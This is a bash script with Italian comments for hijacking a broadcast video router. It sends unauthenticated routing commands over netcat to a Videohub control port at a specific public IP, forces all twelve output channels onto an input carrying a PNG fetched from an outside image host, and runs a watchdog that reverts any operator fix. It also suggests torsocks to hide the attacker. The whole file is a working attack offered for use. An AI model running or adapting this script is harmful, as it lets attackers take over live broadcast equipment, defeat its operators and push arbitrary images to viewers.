#!/bin/bash
# NDI_HIJACK_VIDEHUB_PURE - Input 11 (FROM Studio) - ZERO dipendenze

VIDEOHUB_IP="66.44.213.48"
VIDEOHUB_PORT=9990
NDI_NAME="TRUSTEDF57"
PNG_URL="https://i.postimg.cc/tJq1ZFH3/pat.png"
NDI_INPUT=11  # FROM Studio - più affidabile

# Download PNG
echo "[+] Downloading payload PNG..."
wget -O pat.png "$PNG_URL" || curl -L -o pat.png "$PNG_URL"

echo "[+] Starting 1080p60 PNG live stream → Input 11..."
# FFmpeg UDP multicast su porta Videohub Input 11 (FROM Studio)
ffmpeg -stream_loop -1 -re -i pat.png \
  -vf "scale=1920:1080,fps=60" \
  -pix_fmt yuv420p \
  -f mpegts udp://239.0.0.11:1234?pkt_size=1316 \
  -loglevel error &

FFMPEG_PID=$!
sleep 5

echo "[+] Stream LIVE - FORCE HIJACK tutti i canali su Input 11..."
# HIJACK FORZATO con delay anti-rate-limit
for CH in {0..11}; do
    echo -e "OUT ${CH} ${NDI_INPUT}" | nc -w 1 ${VIDEOHUB_IP} ${VIDEOHUB_PORT}
    sleep 0.2
    echo "[+] CH${CH} → Input11 (FROM Studio)"
done

# WATCHDOG migliorato
watchdog() {
    while kill -0 $FFMPEG_PID 2>/dev/null; do
        ROUTING=$(timeout 2 bash -c "echo 'VIDEO ROUTING' | nc ${VIDEOHUB_IP} ${VIDEOHUB_PORT} 2>/dev/null")
        for CH in {0..11}; do
            if ! echo "$ROUTING" | grep -q "OUT ${CH} ${NDI_INPUT}"; then
                echo -e "OUT ${CH} ${NDI_INPUT}" | nc -w 1 ${VIDEOHUB_IP} ${VIDEOHUB_PORT}
                echo "[!] RESTORED CH${CH} → TRUSTEDF57"
            fi
        done
        sleep 3
    done
}

watchdog &
WATCHDOG_PID=$!

echo "🔥 FULL HIJACK ATTIVO - Input 11 (FROM Studio) su TUTTI i 12 canali"
echo "📺 TUTTI vedono il tuo PNG live stream!"
echo "[+] Verifica: torsocks nc ${VIDEOHUB_IP} ${VIDEOHUB_PORT}"
echo "[+]     > VIDEO ROUTING"
echo "[+] Watchdog anti-restore ON (Ctrl+C stop)"

# Mostra status live
while kill -0 $FFMPEG_PID 2>/dev/null; do
    echo -n "[Status] "
    echo "VIDEO OUTPUT ROUTING" | nc ${VIDEOHUB_IP} ${VIDEOHUB_PORT} 2>/dev/null | grep "OUT " | head -3
    sleep 10
done &

trap "kill $FFMPEG_PID $WATCHDOG_PID $! 2>/dev/null; echo '[+] Hijack stopped'; rm -f pat.png; exit" INT TERM
wait $FFMPEG_PID
